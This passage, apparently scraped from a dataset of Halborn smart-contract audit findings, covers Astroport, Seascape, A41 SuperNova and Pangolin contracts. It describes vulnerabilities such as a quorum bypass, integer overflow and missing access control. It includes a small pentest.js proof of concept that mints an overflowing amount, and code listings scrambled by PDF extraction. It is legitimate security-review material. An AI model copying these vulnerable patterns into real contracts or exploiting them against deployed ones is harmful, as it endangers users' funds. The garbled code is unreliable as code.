"https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Astral_Assembly_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The assembly contract uses different block heights when casting a vote and when calculating the total voting power available for a proposal. This situation could allow proposals to bypass the quorum required for approval. The proposal_quorum is defined as the ratio of total votes to total voting power. However, the calculation of each vote cast and thus total_votes queries XAstro token in proposal.start_block but total_voting_power does so in proposal.start_block - 1, effectively retrieving different states of the XAstro supply. On the other hand, the VxAstro token consistently uses proposal.start_time - 1 in both cases. To illustrate this issue, take the following example attack scenario which, for simplicity, only considers the XAstro token: 1. Suppose at block height 100 the XAstros total supply is 1000, proposal_required_quorum set to 10% and proposal_required_threshold set to 20%. 2. In the next block (101), more XAstro tokens are minted, taking the total supply to 1500. At this point, a proposal is submitted. 3. By the end of the voting period, the active proposal will have received 100 votes, 21 of which will be for votes. 4. Finally, end_proposal is called on the aforementioned proposal. proposal_quorum will be 100 / 1000 since proposal.start_block - 1 is requested for the denominator instead of 100 / 1500. This will unfairly mark the proposal as Passed, since the quorum check requires a smaller than effective total_voting_power to cast votes. 15 Code Location: Listing 2: contracts/assembly/src/contract.rs (Line 700) 689 pub fn calc_voting_power ( deps : & DepsMut , 690 sender : String , 691 proposal : & Proposal , 692 693 ) -> StdResult < Uint128 > { 694 695 696 let config = CONFIG . load ( deps . storage ) ?; let xastro_amount : BalanceResponse = deps . querier .  query_wasm_smart ( 697 698 699 700 701 config . xastro_token_addr , & XAstroTokenQueryMsg :: BalanceAt { address : sender . clone () , block : proposal . start_block , }, Listing 3: contracts/assembly/src/contract.rs (Line 746) 739 pub fn calc_total_voting_power_at ( deps : & DepsMut , proposal : &  Proposal ) -> StdResult < Uint128 > { 740 741 742 743 744 745 746 747 748 let config = CONFIG . load ( deps . storage ) ?; // Total xASTRO supply at a specified block let mut total : Uint128 = deps . querier . query_wasm_smart ( config . xastro_token_addr , & XAstroTokenQueryMsg :: TotalSupplyAt { block : proposal . start_block - 1, }, ) ?; Risk Level: Likelihood - 3 Impact - 3 16 Recommendation: A consistent block height and time should be used when retrieving in- formation about total supplies and total balances that are expected to reflect the same state of a token. Remediation plan: NOT APPLICABLE: The underlying logic in storing SnapshotMap effectively reflected the users voting power (calculated at calc_voting_power) in proposal.start_block - 1. Causing the block height to be selected con- sistently in all the relevant places. 17 ", "labels": ["Halborn", "Astroport_fi_Astral_Assembly_CosmWasm", "Severity: Medium"]}, {"title": "NO MINIMUM THRESHOLD FOR EFFECTIVE DELAY PERIOD", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Astral_Assembly_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Timelocks are defined in the assembly contract to allow users of the protocol to react in time if a change made is bad faith or is not in the best interest of the protocol and its users. and not restrict functions update_config instantiate do assembly The and timelocks contract proposal_expiration_period) from being greater than or equal to a minimum threshold. Therefore, malicious changes proposed through voting could even be executed immediately if execution_delay_period is not set appropriately. of (execution_delay_period the Code Location: Listing 4: contracts/assembly/src/contract.rs (Lines 67,68) xastro_token_addr : addr_validate_to_lower ( deps . api , & msg . vxastro_token_addr : addr_validate_to_lower ( deps . api , & msg . builder_unlock_addr : addr_validate_to_lower ( deps . api , & msg . proposal_voting_period : msg . proposal_voting_period , proposal_effective_delay : msg . proposal_effective_delay , proposal_expiration_period : msg . proposal_expiration_period , proposal_required_deposit : msg . proposal_required_deposit , proposal_required_quorum : Decimal :: from_str (& msg . 62 let config = Config { 63  xastro_token_addr )? , 64  vxastro_token_addr )?, 65  builder_unlock_addr )? , 66 67 68 69 70  proposal_required_quorum )? , 71  proposal_required_threshold )? , 72 }; proposal_required_threshold : Decimal :: from_str (& msg . 18 Listing 5: contracts/assembly/src/contract.rs (Lines 557,561) 556 if let Some ( proposal_effective_delay ) = updated_config .  proposal_effective_delay { config . proposal_effective_delay = proposal_effective_delay ; 557 558 } 559 560 if let Some ( proposal_expiration_period ) = updated_config .  proposal_expiration_period { config . proposal_expiration_period = proposal_expiration_period 561  ; 562 } Risk Level: Likelihood - 1 Impact - 4 Recommendation: to that ensure Add a validation routine inside the instantiate and update_config and timelock functions proposal_expiration_period) is greater than or equal to a minimum threshold that allows users of Astroport will act promptly against any issue the protocol could have when changes are made. The following are some examples of timelocks used in other protocols: (execution_delay_period  Uniswap: 48-hours timelock  Compound: 48-hours timelock  Aave: 24-hours timelock (Short time lock) Remediation plan: SOLVED: The issue was fixed in commit 6dcfefe59514a85495a4e34a2ec50ea41f0d10d2. 19 ", "labels": ["Halborn", "Astroport_fi_Astral_Assembly_CosmWasm", "Severity: Low"]}, {"title": "UNCHECKED ARITHMETIC", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Astral_Assembly_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In computer programming, an overflow occurs when an arithmetic operation attempts to create a numeric value that is outside the range that can be represented by a given number of bits -- either greater than the maximum value or less than the minimum representable value. This issue has been raised as informational only, since it was not possible to define a clear exploitation scenario for the affected case. Code Location: Listing 6: Affected resources 1 contracts / assembly / src / contract . rs :715:  locked_amount . params . amount - locked_amount . status . astro_withdrawn  ) ?; . checked_add ( Risk Level: Likelihood - 1 Impact - 1 Recommendation: In release mode Rust does not panic on overflows and overflown values It is recom- just wrap without any explicit feedback to the user. mended then to use vetted safe math libraries for arithmetic operations consistently throughout the smart contract system. Consider replacing the addition operator with Rusts checked_add method, the subtraction operator with Rusts checked_subs method, and so on. 20 Remediation plan: SOLVED: The issue was fixed in commit 6dcfefe59514a85495a4e34a2ec50ea41f0d10d2. 21 ", "labels": ["Halborn", "Astroport_fi_Astral_Assembly_CosmWasm", "Severity: Informational"]}, {"title": "INTEGER OVERFLOW", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Block_Lords_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The Lord.sol and Mead.sol smart contracts use an insecure arithmetic operation using the totalSupply() and amount variables to determine if it is possible to mint that amount. This operation could lead to an integer overflow if the actual supply of tokens and the amount to mint are high numbers. Code Location: Listing 1: Lord.sol (Line 162) 161  { 162 function mint ( address to , uint256 amount ) external onlyBridge require ( totalSupply () + amount <= limitSupply , \" exceeded  mint limit \" ); 163 164 } _mint ( to , amount ); Listing 2: Mead.sol (Line 77) bytes32 message = \" \\ x19Ethereum Signed Message :\\ function mint ( uint256 _amount , uint8 _v , bytes32 _r , bytes32 // investor , project verification bytes memory prefix 68  _s ) external { 69 70  n32 \" ; 71  sender , address ( this ) , block . chainid , _amount , mintId , mintNonceOf  [ msg . sender ]) ); 72  prefix , message )); 73 74 75 76 = keccak256 ( abi . encodePacked ( msg . require ( bridges [ recover ], \" sig \" ); = ecrecover ( hash , _v , _r , _s ); = keccak256 ( abi . encodePacked ( address recover bytes32 hash 14 require ( totalSupply () + _amount <= limitSupply , \" exceeded 77  mint limit \" ); 78 79 80 81 82 } mintNonceOf [ msg . sender ]++; _mint ( msg . sender , _amount ); Proof of Concept: to replicate this issue:  in lord.sol:  increase limit supply by any number.  try to mint an amount which could cause an overflow, for example 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa.  in mead.sol:  mint a high amount, for example 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa.  mint again any amount greater than 5 to cause overflow. Listing 3: pentest.js let amount1 = '0 let amount2 = '7 '; 1  xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa '  ; 2 3 4 5 6 7 await mead . connect ( bridge ). mint ( amount1 , sig .v , sig .r , sig . s); await mead . connect ( bridge ). mint ( amount2 , sig .v , sig .r , sig . s); // .. snipped .. Listing 4: Output 1 Error : VM Exception while processing transaction : reverted with  panic code 0 x11 ( Arithmetic operation underflowed or overflowed 15  outside an unchecked block ) 2 at Mead . mint ( contracts / erc20 / Mead . sol :78) Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to import the OpenZeppelin SafeMath.sol library and set the variables using that SafeMath to avoid these extreme situations. This could be done by adding the following lines to the contracts. Listing 5: safemath.sol 1 import \" @openzeppelin / contracts / utils / math / SafeMath . sol \" ; 2 using SafeMath for uint256 ; Remediation Plan: SOLVED: The SeaScape Team now implements correctly the SafeMath library to avoid these overflows. 16 ", "labels": ["Halborn", "Seascape_Block_Lords", "Severity: Medium"]}, {"title": "EVM STACK LIMIT SURPASSED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Block_Lords_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The EVM stack is a maximum of 16 deep. Every variable that is created will get pushed onto the stack. This includes function parameters and local variables. The Lord constructor uses too many parameters and local variables, which causes the following error to be displayed at compile time. Listing 6: StackLimit 1 CompilerError : Stack too deep when compiling inline assembly :  Variable headStart is 1 slot ( s) too deep inside the stack . Code Location: Listing 7: Lord.sol 29 constructor ( 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 address _seedSale , address _strategicSale , address _privateSale , address _launchpads , address _ieo , address _lordsBounty , address _kingsBounty , address _dynastyIncentives , address _liquidity , address _foundationReserve , address _advisor , bool _bridgeAllowed ) ERC20 ( \" BLOCKLORDS \" , \" LORD \") { bridgeAllowed = _bridgeAllowed ; uint256 _million = 1000 * 1000 * 10 ** 18; uint256 thousand = 1000 * 10 ** 18; if (! _bridgeAllowed ) { 17 _mint ( _seedSale , 8 * _million + (750 * thousand )) ; _mint ( _seedSale , 6 * _million + (250 * thousand )) ; // // _mint ( _privateSale , 7 * _million ); _mint ( _launchpads , 2 * _million ); // 8.75% of 100 // 8.75% of 100 _mint ( _ieo , 1 * _million ); _mint ( _lordsBounty , 25 * _million ); // 8.75% of 100 million // 8.75% of 100 // 8.75% of 100 _mint ( _kingsBounty , 10 * _million ); _mint ( _dynastyIncentives , 15 * _million ); // 8.75% of _mint ( _liquidity , 10 * _million ); // 8.75% of 100 _mint ( _foundationReserve , 10 * _million ); // 8.75% of _mint ( _advisor , 5 * _million ); // 8.75% of 100 47  8.75% of 100 million 48  8.75% of 100 million 49  million 50  million 51 52  million 53  million 54  100 million 55  million 56  100 million 57  million 58 59  million tokens \" ); 60 61 } } require ( totalSupply () == 100 * _million , \" not a 100 Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to refactor the parameters of the smart contract constructor. The use of structures containing variables that can be bundled together is recommended. It could also be feasible to execute part of the instructions in a new function called inside the constructor. 18 Remediation Plan: SOLVED: The minting process is now done address by address in several new functions. 19 ", "labels": ["Halborn", "Seascape_Block_Lords", "Severity: Low"]}, {"title": "SAFEMATH LIBRARY IS NOT CORRECTLY IMPLEMENTED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Block_Lords_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The Lord.sol and Mead.sol smart contracts use .add() and .sub() functions located in the OpenZeppelin SafeMath library. This library is neither imported nor associated to a variable type (in this case uint256), so the mentioned functions cannot be used. Code Location: Listing 8: Lord.sol (Line 93) require ( totalSupply . add ( amount ) <= limitSupply , \" exceeded 92 function mint ( address to , uint256 amount ) external onlyBridge { 93  mint limit \" ); 94 95 _mint ( to , amount ); } Listing 9: Lord.sol (Lines 123,124) 119 function burnFrom ( address account , uint256 amount ) public  onlyBridge { 120  ); 121 uint256 currentAllowance = allowance ( account , _msgSender () require ( currentAllowance >= amount , \" burn amount exceeds  allowance \"); 122 123 124 125 126 } _approve ( account , _msgSender () , currentAllowance . sub ( amount , \" transfer amount exceeds allowance \" )) ; _burn ( account , amount ); Listing 10: Mead.sol (Line 73) function mint ( uint256 _amount , uint8 _v , bytes32 _r , bytes32 63  _s ) external { 20 bytes32 hash bytes32 message address recover = \" \\ x19Ethereum Signed Message :\\ = keccak256 ( abi . encodePacked ( prefix // investor , project verification bytes memory prefix 64 65  n32 \" ; 66 = keccak256 ( abi . encodePacked ( msg .  sender , address ( this ) , chainid , _amount , mintId , mintNonceOf [ msg .  sender ]) ); 67  , message )); 68 69 70 71 72  mint limit \" ); 73 74 75 76 77 require ( bridges [ recover ], \" sig \" ); require ( _totalSupply . add ( amount ) <= limitSupply , \" exceeded = ecrecover ( hash , _v , _r , _s ); _mint ( msg . sender , _amount ); mintNonceOf [ msg . sender ]++; } Risk Level: Likelihood - 2 Impact - 3 Recommendation: It is recommended to import the OpenZeppelin SafeMath.sol library and set the variables that are using that SafeMath. This could be done by adding the following lines to the contracts. Listing 11: safemath.sol 1 import \" @openzeppelin / contracts / utils / math / SafeMath . sol \" ; 2 using SafeMath for uint256 ; 21 Remediation Plan: SOLVED: The SeaScape Team now implements correctly the SafeMath library. 22 ", "labels": ["Halborn", "Seascape_Block_Lords", "Severity: Low"]}, {"title": "TOTALSUPPLY VALUE SHOULD BE OBTAINED BY TOTALSUPPLY(", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Block_Lords_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The Lord.sol and Mead.sol smart contracts use _totalSupply variable to This value is defined as a private obtain the tokens total supply. variable in the OpenZeppelin ERC20 implementation; therefore, it should be obtained by using the get method totalSupply(). Code Location: Listing 12: Lord.sol 59 require ( totalSupply == 100 * _million , \" not a 100 million tokens \" )  ; Listing 13: Lord.sol 93 require ( totalSupply . add ( amount ) <= limitSupply , \" exceeded mint  limit \" ); Listing 14: Mead.sol 73 require ( _totalSupply . add ( amount ) <= limitSupply , \" exceeded mint  limit \" ); Risk Level: Likelihood - 2 Impact - 2 23 Recommendation: It is recommended to use the get method totalSupply() to retrieve the token total supply. Remediation Plan: SOLVED: The SeaScape team now uses the totalSupply() method to retrieve the total token supply. 24 ", "labels": ["Halborn", "Seascape_Block_Lords", "Severity: Low"]}, {"title": "UNDEFINED VARIABLES ARE USED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Block_Lords_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The Lord.sol, Mead.sol and ImportExportElasticNft.sol smart contracts use undefined variables, resulting in contracts which do not compile. Code Location:  limitSupply (Lord.sol#93)  bridgeAllowed (Mead.sol#36,46)  amount (Mead.sol#73)  memory_amount (Mead.sol#98)  chainid (Mead.sol#67,90) Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to declare all used variables. In the case of the chain ID variable, it is recommended to recalculate it each time it is used because its value could change in case of a fork. For this purpose, block.chainid could be used instead of creating a variable. Remediation Plan: SOLVED: The SeaScape Team now implements the mentioned variables. 25 ", "labels": ["Halborn", "Seascape_Block_Lords", "Severity: Low"]}, {"title": "ONLYBRIDGE MODIFIER IS NEVER USED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Block_Lords_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The onlyBridge modifier is never used in the code. Code Location: Listing 15: Mead.sol 25 26 27 28 modifier onlyBridge { require ( bridges [ msg . sender ]) ; _ ; } Risk Level: Likelihood - 2 Impact - 1 Recommendation: It is recommended to remove or comment the unused code from the contracts. Remediation Plan: SOLVED: The SeaScape Team now uses the onlyBridge modifier on the mint and burn functions. 26 ", "labels": ["Halborn", "Seascape_Block_Lords", "Severity: Informational"]}, {"title": "SEEDSALE ADDRESS RECEIVES GREATER AMOUNT THAN INTENDED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Block_Lords_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Several amounts are minted to the accounts, added as arguments in the constructor. Different amounts are minted twice in the _seedsale account, making this account 15 million instead of 8.75 million. Code Location: Listing 16: Lord.sol (Lines 50,51) 29 constructor ( 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  8.75% of 100 million 48  8.75% of 100 million 49  million 50  million address _seedSale , address _strategicSale , address _privateSale , address _launchpads , address _ieo , address _lordsBounty , address _kingsBounty , address _dynastyIncentives , address _liquidity , address _foundationReserve , address _advisor , bool _bridgeAllowed ) ERC20 ( \" BLOCKLORDS \" , \" LORD \") { bridgeAllowed = _bridgeAllowed ; uint256 _million = 1000 * 1000 * 10 ** 18; uint256 thousand = 1000 * 10 ** 18; if (! _bridgeAllowed ) { _mint ( _seedSale , 8 * _million + (750 * thousand )) ; _mint ( _seedSale , 6 * _million + (250 * thousand )) ; _mint ( _privateSale , 7 * _million ); _mint ( _launchpads , 2 * _million ); // 8.75% of 100 // 8.75% of 100 // // 27 _mint ( _ieo , 1 * _million ); _mint ( _lordsBounty , 25 * _million ); // 8.75% of 100 million // 8.75% of 100 // 8.75% of 100 _mint ( _kingsBounty , 10 * _million ); _mint ( _dynastyIncentives , 15 * _million ); // 8.75% of _mint ( _liquidity , 10 * _million ); // 8.75% of 100 _mint ( _foundationReserve , 10 * _million ); // 8.75% of _mint ( _advisor , 5 * _million ); // 8.75% of 100 require ( totalSupply () == 100 * _million , \" not a 100 51 52  million 53  million 54  100 million 55  million 56  100 million 57  million 58 59  million tokens \" ); 60 61 } } Risk Level: Likelihood - 1 Impact - 2 Recommendation: It is recommended that you review the amounts that are minted to each account. Remediation Plan: SOLVED: The seedsale address now receives the correct amount of tokens. 28 ", "labels": ["Halborn", "Seascape_Block_Lords", "Severity: Informational"]}, {"title": "FUNCTION STATE CAN BE RESTRICTED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Block_Lords_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The state mutability of the burn() function can be restricted to pure. Code Location: Listing 17: Lord.sol 104 105 106 function burn ( uint256 amount ) public { require ( false , \" Only burnFrom is allowed \" ); } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to restrict the state of the function to pure for saving gas. Remediation Plan: SOLVED: The SeaScape team has removed the affected function. 29 ", "labels": ["Halborn", "Seascape_Block_Lords", "Severity: Informational"]}, {"title": "ACCESS CONTROL NOT ENFORCED FOR CREATING PAIRS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/A41_SuperNova_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "As explicated in the provided documentation, the instruction for pair creation in the factory contract should be only called by the factorys owner. However, the code does not reflect the documentation because there is no check if msg.sender is the factorys owner in the function execute_create_pair. With this, anyone can create liquidity pools, that should be created by the factorys owner. Proof of Concept: In the following link is included a walkthrough video with the proof of concept. Code Location: Fragment of execute_create_pair: Listing 1: contracts/factory/contract.rs 146 fn execute_create_pair ( deps : DepsMut , 147 env : Env , 148 pair_type : PairType , 149 asset_infos : [ AssetInfo ; 2] , 150 151 init_params : Option < Binary >, 152 ) -> Result < Response , ContractError > { 153 154 155 156 157 asset_infos [0]. check ( deps . api ) ?; asset_infos [1]. check ( deps . api ) ?; if asset_infos [0] == asset_infos [1] { return Err ( ContractError :: DoublingAssets {}) ; 12 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 } } let config = CONFIG . load ( deps . storage ) ?; if PAIRS . may_load ( deps . storage , & pair_key (& asset_infos )) ? . is_some () { } return Err ( ContractError :: PairWasCreated {}) ; // Get pair type from config let pair_config = PAIR_CONFIGS . load ( deps . storage , pair_type . to_string () ) . map_err (| _| ContractError :: PairConfigNotFound {}) ?; // Check if pair config is disabled if pair_config . is_disabled { return Err ( ContractError :: PairConfigDisabled {}) ; } Risk Level: Likelihood - 5 Impact - 4 Recommendation: The msg.sender should be checked in the function execute_create_pair to be the factorys owner. Remediation Plan: SOLVED: The issue was fixed in commit 7560afb6d5f53a911f3df92bb7fec88d1099ba02. 13 ", "labels": ["Halborn", "A41_SuperNova_CosmWasm", "Severity: High"]}, {"title": "SLIPPAGE NOT ENFORCED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/A41_SuperNova_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the pair liquidity providing functionality in the pair contract, there is no maximum threshold being asserted to the liquidity pool. This can severely affect users amount of token received in return of the provided liquidity. In the code, there is a commented call to a assert_slippage_tolerance function that has not been implemented. Code Location: Fragment of provide_liquidity: Listing 2: contracts/pair/contract.rs (Lines 330,331) 312 if amp == MINIMUM_AMP && !pools [0]. amount . is_zero () && !pools  [1]. amount . is_zero () { 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 let reserve_a = Uint256 :: from ( pools [0]. amount ); let reserve_b = Uint256 :: from ( pools [1]. amount ); let amount_a = Uint256 :: from ( deposits [0]) ; let amount_b = Uint256 :: from ( deposits [1]) ; let real_amount_b = reserve_b * amount_a / reserve_a ; let real_amount_a = reserve_a * amount_b / reserve_b ; let optimal_amount_b = Uint128 :: try_from ( real_amount_b ) ?; let optimal_amount_a = Uint128 :: try_from ( real_amount_a ) ?; if deposits [1] > optimal_amount_b { deposits [1] = optimal_amount_b ; } else if deposits [0] > optimal_amount_a { deposits [0] = optimal_amount_a ; } } // Assert that slippage tolerance is respected 14 331 // assert_slippage_tolerance (& slippage_tolerance , & deposits , &  pools ) ?; 332 333 334 // decimals of each token . let token_precision_0 = query_token_precision (& deps . querier ,  pools [0]. info . clone () ) ?; 335 let token_precision_1 = query_token_precision (& deps . querier ,  pools [1]. info . clone () ) ?; 336 let greater_precision = token_precision_0 . max (  token_precision_1 ); 337 } Risk Level: Likelihood - 3 Impact - 3 Recommendation: Enforce the use of a default maximum threshold when users add liquidity to the pairs. Remediation Plan: RISK ACCEPTED: The A41 team accepted the risk for this finding. 15 ", "labels": ["Halborn", "A41_SuperNova_CosmWasm", "Severity: Medium"]}, {"title": "POOL PAUSE MECHANISM NOT IMPLEMENTED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/A41_SuperNova_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "There is no mechanism implemented to pause the pools in the pair or factory contract. It is important to have such mechanism in case an incident occur involving some pool in the protocol. Risk Level: Likelihood - 1 Impact - 4 Recommendation: Implement a way to pause a liquidity pool in the contracts. Remediation Plan: SOLVED: The issue was fixed in commit f01837f816fb6b6eba8ca099dbc9030f14f9a261. 16 ", "labels": ["Halborn", "A41_SuperNova_CosmWasm", "Severity: Low"]}, {"title": "PRIVILEGED ADDRESS CAN BE TRANSFERRED WITHOUT CONFIRMATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/A41_SuperNova_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "An incorrect use of the update_owner function from the factory contract could set the owner to an invalid address, unwillingly losing control of the contract, which cannot be undone in any way. Currently, the owner of the contracts can change its address using the aforementioned function in a single transaction and without confirmation from the new address. Code Location: Listing 3: contracts/factory/contract.rs let mut config = CONFIG . load ( deps . storage ) ?; return Err ( ContractError :: Unauthorized {}) ; 110 fn execute_update_owner ( deps : DepsMut , 111 info : MessageInfo , 112 new_owner : String , 113 114 ) -> Result < Response , ContractError > { 115 116 117 118 119 120 121 122 123 124 } 125 if info . sender ! = config . owner { } } config . owner = deps . api . addr_validate ( new_owner . as_str () ) ?; CONFIG . save ( deps . storage , & config ) ?; Ok ( Response :: new () . add_attribute ( \" action \" , \" update_owner \")) Risk Level: Likelihood - 1 Impact - 4 17 Recommendation: The update_owner function should follow a two steps process, being split into set_owner and accept_owner functions. The latter one requiring the transfer to be completed by the recipient, effectively protecting the contract against potential typing errors compared to single-step owner transfer mechanisms. Remediation Plan: SOLVED: The issue was fixed in commit 428f3ab553cc54bf5e50d65366e3de4eee466bd7. 18 ", "labels": ["Halborn", "A41_SuperNova_CosmWasm", "Severity: Low"]}, {"title": "UNCHECKED ARITHMETIC", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/A41_SuperNova_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "During our analysis, it was found the use of unchecked multiplications and divisions in multiple source files. This could potentially lead to panic the contracts execution under some scenarios without showing users the reason of the error. It is worth to mention that this issue was classified as informational because the flag overflow-checks has been set to true in the Cargo.toml file. Unsafe math was found in the following files and functions:  contracts/vault/contract.rs: execute_claim  contracts/pair/contract.rs: provide_liquidity  contracts/pair/utils.rs: compute_offer_amount  contracts/pair/utils.rs: assert_max_spread  contracts/pair/utils.rs: start_changing_amp  contracts/pair/utils.rs: compute_current_amp  contracts/pair/utils.rs: get_share_in_assets Code Location: Fragment of execute_claim: Listing 4: contracts/vault/contract.rs (Line 101) 92 93 94 95 96 97 98 99 100 update_pool ( & deps . querier , deps . storage , env . clone () , & mut vault_info , None , ) ?; let reward_per_share = vault_info . reward_per_share . div (  multiplier () ); 19 101 let pending_reward = user_info . amount * reward_per_share -  user_info . reward_debt ; 102 103 104 105 106 107 108 } // check pool has enough balance to send a reward let pool_reward = query_asset_balance ( & deps . querier , env . contract . address , config . rewar Fragment of execute_claim: Listing 5: contracts/vault/contract.rs (Lines 46,47) // ask => offer offer_pool : Uint128 , offer_precision : u8 , ask_pool : Uint128 , ask_precision : u8 , ask_amount : Uint128 , commission_rate : Decimal , amp : u64 , 29 pub fn compute_offer_amount ( 30 31 32 33 34 35 36 37 ) -> StdResult <( Uint128 , Uint128 , Uint128 ) > { 38 39 40 41  greater_precision ) ?; 42  greater_precision ) ?; 43  greater_precision ) ?; 44 45 46  one_minus_commission ; 47  inv_one_minus_commission ; 48 49 50 51 52 offer_pool . u128 () , ask_pool . u128 () , let offer_amount = Uint128 :: new ( calc_offer_amount ( let greater_precision = offer_precision . max ( ask_precision ); let offer_pool = adjust_precision ( offer_pool , offer_precision , let ask_pool = adjust_precision ( ask_pool , ask_precision , let ask_amount = adjust_precision ( ask_amount , ask_precision , let one_minus_commission = Decimal :: one () - commission_rate ; let inv_one_minus_commission : Decimal = Decimal :: one () / let before_commission_deduction = ask_amount * 20 before_commission_deduction . u128 () , amp , ) . unwrap () , ); 53 54 55 56 57 58 } Risk Level: Likelihood - 1 Impact - 1 Recommendation: In release mode, Rust does not panic on overflows and overflown values just wrap without any explicit feedback to the user. It is recommended then to use vetted safe math libraries for arithmetic operations con- sistently throughout the smart contract system. Consider replacing the multiplication operator with Rusts checked_div method, the multiplica- tion operator with Rusts checked_mul method, and so on. Remediation Plan: ACKNOWLEDGED: The A41 Team acknowledged this finding. 21 ", "labels": ["Halborn", "A41_SuperNova_CosmWasm", "Severity: Informational"]}, {"title": "INCOMPLETE DOCUMENTATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/A41_SuperNova_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The documentation provided is incomplete. For instance, the documentation included in the GitHub repository should include a contract diagram, instructions for users on how to interact with the contracts, list of the contracts with usage purpose and a walkthrough on how to deploy and test the smart contracts. Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider updating the documentation in GitHub for clarifying data flow and work of the contract for the users and greater ease when contracts are deployed and tested. Have a Non-Developer or QA resource work through the process to make sure it addresses any gaps in the set-up steps due to technical assumptions. Remediation Plan: ACKNOWLEDGED: The A41 Team acknowledged this finding. 22 THANK YOU FOR CHOOSING", "labels": ["Halborn", "A41_SuperNova_CosmWasm", "Severity: Informational"]}, {"title": "MINT FUNCTION IS MISSING MOVEDELEGATES CALL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Exchange_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the Png contract, the function mint() does not call the _moveDelegates  () function: Listing 1: PNG.sol 184 function mint ( address dst , uint rawAmount ) external returns ( bool )  { 185 186 187 188 189 } require ( msg . sender == minter && minter != address (0) , \" Png ::  mint : unauthorized \" ); uint96 amount = safe96 ( rawAmount , \" Png :: mint : amount exceeds  96 bits \" ); _mintTokens ( dst , amount ); return true ; Listing 2: PNG.sol 421 function _mintTokens ( address dst , uint96 amount ) internal { 422 require ( dst != address (0) , \" Png :: _mintTokens : cannot mint to  the zero address \" ); 423 424 425 426 427 428 429 } totalSupply = SafeMath . add ( totalSupply , uint ( amount )) ; balances [ dst ] = add96 ( balances [ dst ], amount , \" Png :: _mintTokens  : mint amount overflows \" ); emit Transfer ( address (0) , dst , amount ); require ( totalSupply <= maxSupply , \" Png :: _mintTokens : mint  result exceeds max supply \"); This causes that every time Png tokens are minted the users will have to manually call delegate() passing their own address as parameter so their voting power is correctly accounted/updated in the smart contract: 13 Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to add the _moveDelegates() function call into the _mintTokens() function. Remediation Plan: SOLVED: bbbf14abf0283fa7ea3ccf07288fecdc177ed8f9. Pangolin team solved the issue in the commit id 14 ", "labels": ["Halborn", "Pangolin_Exchange", "Severity: Medium"]}, {"title": "LACK OF TRANSFEROWNERSHIP PATTERN", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Exchange_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "All functions that involve some kind of transfer of ownership require a single step, which is to set up the new privileged address. If this designated EOA account is not a valid account, it is very possible that the transfer of ownership will be made to an uncontrolled account, losing access to privileged functions. Code location: PNG.sol Listing 3: PNG.sol (Line 267) 264 function setMinter ( address newMinter ) external returns ( bool ) { 265 266 267 268 269 } require ( msg . sender == admin , \" Png :: setMinter : unauthorized \" ); emit 